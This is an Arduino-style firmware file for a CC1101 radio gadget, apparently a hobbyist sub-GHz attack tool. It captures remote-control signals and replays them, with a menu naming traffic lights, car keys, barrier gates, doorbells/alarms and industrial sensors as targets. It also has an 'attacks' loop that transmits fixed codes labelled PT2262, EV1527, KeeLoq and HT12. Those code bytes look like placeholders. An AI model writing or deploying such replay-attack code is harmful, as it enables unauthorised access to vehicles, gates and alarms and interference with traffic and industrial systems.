#include <RadioLib.h>
#include "config.h"
#include "rfid_controll.h"
#include "controll_1101.h"

CC1101 cc1101 = new Module(5, 12, 4, 15); // CS, RESET, GDO0, SCK

enum TargetType {
    TRAFFIC_LIGHT,
    TOYS_RC,
    CAR_KEYS,
    DOORBELL,
    INDUSTRIAL
};

const char* targetNames[] = {
    "Traffic Light",
    "Toys/RC",
    "Car Keys/Shlagbaums",
    "Doorbell/Alarm",
    "Industrial Sensor"
};

struct Attack {
  const char* name;
  float freq;
  uint8_t* code;
  int length;
};

uint8_t pt2262_code[] = {0xA1, 0xA1, 0x0E, 0x0E, 0xA1, 0x0E, 0xA1, 0x0E};
uint8_t ev1527_code[] = {0xAA, 0xB2, 0xC3, 0xD4, 0xE5};
uint8_t keeloq_code[] = {0x12, 0x34, 0x56, 0x78};
uint8_t ht12_code[]   = {0xF0, 0x0F, 0xF0, 0x0F, 0xAA, 0x55};

Attack attacks[] = {
  {"PT2262", 433.92, pt2262_code, sizeof(pt2262_code)},
  {"EV1527", 433.92, ev1527_code, sizeof(ev1527_code)},
  {"KeeLoq", 315.00, keeloq_code, sizeof(keeloq_code)},
  {"HT12",   315.00, ht12_code,   sizeof(ht12_code)},
  {"KeeLoq", 433.92, keeloq_code, sizeof(keeloq_code)},
  {"KeeLoq", 868.00, keeloq_code, sizeof(keeloq_code)},
};

bool attackRunning = false;

TargetType chooseTarget() {
    int option = 0;
    while (true) {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 0);
        display.print("Select Target:");
        for (int i = 0; i < 5; i++) {
            display.setCursor(0, 15 + i*10);
            if (option == i) display.print("> ");
            else display.print("  ");
            display.print(targetNames[i]);
        }
        display.display();

        if (!digitalRead(BTN_UP_PIN)) { option = (option + 4) % 5; delay(200); }
        else if (!digitalRead(BTN_DOWN_PIN)) { option = (option + 1) % 5; delay(200); }
        else if (!digitalRead(BTN_SELECT_PIN)) { delay(300); return (TargetType)option; }
    }
}

void cc1101_signal_capture() {
    cc1101.begin();
    
    TargetType target = chooseTarget();

    float freq = 433.0;
    if (target == CAR_KEYS) freq = 315.0;
    if (target == TOYS_RC) freq = 433.0;
    if (target == INDUSTRIAL) freq = 433.0;

    int state = cc1101.begin(freq) != RADIOLIB_ERR_NONE ? 0 : 1;
    cc1101.startReceive();

    uint8_t lastData[64];
    int lastLen = 0;

    bool recording = true;
    bool running = true;

    bool downLast = false;
    bool selectLast = false;
    bool upLast = false;

    while (running) {
        bool downState = !digitalRead(BTN_DOWN_PIN);
        bool selectState = !digitalRead(BTN_SELECT_PIN);
        bool upState = !digitalRead(BTN_UP_PIN);

        if (recording) {
            int n = cc1101.readData(lastData, sizeof(lastData));
            if (n > 0) lastLen = n;
        }

        if (downState && !downLast && lastLen > 0) {
            cc1101.transmit(lastData, lastLen);
        }
        downLast = downState;

        if (selectState && !selectLast) {
            lastLen = 0;
            int state = cc1101.startReceive();
            recording = true;
        }
        selectLast = selectState;

        if (upState && !upLast) return;
        upLast = upState;

        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 0);
        display.print("Target: ");
        display.print(targetNames[target]);
        display.setCursor(0, 15);
        if (lastLen > 0) display.print("Signal caught! Bytes: ");
        else display.print("Waiting for signal...");
        display.setCursor(0, 25);
        display.print(lastLen);
        display.setCursor(0, 40);
        display.print("DOWN=Send SELECT=Rec UP=Exit");
        display.display();
    }
}

void cc1101_popular_attacks() {
    cc1101.begin();
    attackRunning = true;
    int index = 0;
    int total = sizeof(attacks) / sizeof(attacks[0]);

    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.println("Attack started...");
    display.display();

    while (attackRunning) {
        Attack current = attacks[index];
        cc1101.begin(current.freq);
        cc1101.transmit(current.code, current.length);

        display.clearDisplay();
        display.setCursor(0, 0);
        display.print("Attack: ");
        display.println(current.name);
        display.print("Freq: ");
        display.print(current.freq);
        display.println(" MHz");

        int progress = map(index + 1, 0, total, 0, SCREEN_WIDTH);
        display.fillRect(0, 50, progress, 10, SSD1306_WHITE);

        display.drawBitmap(64, 9, antenna_img, 64, 64, SSD1306_WHITE);
        display.display();

        delay(500);
        index++;

        if (index >= total) {
            display.clearDisplay();
            display.setCursor(30, 20);
            display.setTextSize(2);
            display.println("FINISH!");
            display.display();

            bool waitAction = true;
            while (waitAction) {
                if (digitalRead(BTN_DOWN_PIN) == LOW) {
                    index = 0;
                    waitAction = false;
                }
                if (digitalRead(BTN_SELECT_PIN) == LOW) attackRunning = false, waitAction = false;
            }
        }

        if (digitalRead(BTN_SELECT_PIN) == LOW) attackRunning = false;
    }
}
